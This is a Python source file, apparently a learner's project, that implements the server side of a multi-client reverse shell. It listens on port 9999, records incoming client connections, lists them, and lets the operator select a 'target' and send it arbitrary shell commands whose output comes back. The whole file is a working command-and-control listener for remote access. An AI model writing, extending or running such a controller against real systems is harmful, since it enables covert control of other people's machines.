#I want to create a simple reverse shell for the server side

#Useful libraries that I will be working with -->
import socket
import os
import sys
import time
import threading
from queue import Queue 

#Creating a server that will handle the connectio
threadingNum = 2
jobNum = [1, 2]
queue = Queue()
allConnections = []
allAddress = []
        
host = ""
port = 9999
print(f"Creating and Binding the ports: {port}") #, end = "")

#Create a socket to enable connection 
def createSocket():
    try:
        global socket_ #port, host, socket_

        socket_ = socket.socket()

    except socket.error as msg:
        print(f"Socket creation error: {msg}")


#Next step is creating a function to bind and listen for connections
def bindSocket():
    try:
        global port, host, socket_
        socket_.bind((host, port))
        socket_.listen(5)
    except socket.error as msg:
        print(f"Socket binding error: {msg}")
        print("Retrying...")
        bindSocket()

#Handling connections from multiple clients and saving to a list
#Closing previous connections when server.py file is restarted 
def acceptingConnections():
    for c in allConnections:
        c.close()
    del allConnections[:]
    del allAddress[:]

    while True:
        try:
            #print(f"Checking what is in the accept function: {socket_.accept()}")
            conn, address = socket_.accept()
            socket_.setblocking(1) #This prevents the connection from timing out
            allConnections.append(conn)
            allAddress.append(address)
            print(f"Connections has been estabished: {address[0]}")
        except:
            print(f"Error accepting connections")


#Second thread functions --> This will handle functions like
#1 --> See all the client
#2 --> Select a client
#3 --> Send commands to the connected client
#Interactive prompt for sending commands
#syre_musk command> list
#0 Friend - A : Port
#1 Friend - B : Port
#2 Friend - C : Port
#syre_musk command> select 1
#192.168.0.112> dir

def startShell():
    #print("Start")
    while True:
        cmd = input("command> ")
        if cmd == "list":
            listConnections()
        #elif cmd == "quit":
        #    #break
        #    exit()
        elif "select" in cmd:
            conn = getTarget(cmd)
            if conn:
                sendTargetCommands(conn)
        else:
            print("Command not recognized")

#Display all current active connections with clients
def listConnections():
    results = ""
    for id, conn in enumerate(allConnections):
        try:
            conn.send(str.encode(" "))
            conn.recv(20480)
        except:
            del allConnections[id]
            del allAddress[id]
            continue
        results = f"{id} {allAddress[id][0]} : {allAddress[id][1]} \n"
    print(f"--Clients-- \n{results}")

#Selecting the target
def getTarget(cmd):
    while True:
        try:
            target = int(cmd.replace("select" or "select ", "")) #This gets only the id
            conn = allConnections[target]
            print(f"You are now connected to {allAddress[target][0]}")
            print(f"{allAddress[target][0]} > ", end = "")
            return conn
        except:
            print("Selection not valid")
            return None


#Send commands to clients 
def sendTargetCommands(conn):
    while True:
        try:
            cmd = input("")
            if cmd == "quit":
                break
            if len(str.encode(cmd)) > 0: #This checks if there is command to be processed
                conn.send(str.encode(cmd))
                clientResponse = str(conn.recv(20480), "utf-8")
                print(clientResponse, end="") #The end adds the next statement to the same line
        except:
            print("Error sending commands")
            break

#Create worker threads
def createWorkers():
    for i in range(threadingNum):
        thread = threading.Thread(target = work)
        thread.daemon = True #This releases the memory after the thread
        thread.start()


#Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            createSocket()
            bindSocket()
            acceptingConnections()
        if x == 2:
            startShell()
        queue.task_done()

#This creates the jobs    
def createJobs():
    for x in jobNum:
        queue.put(x)
    queue.join()

if __name__ == "__main__":
    createWorkers()
    createJobs()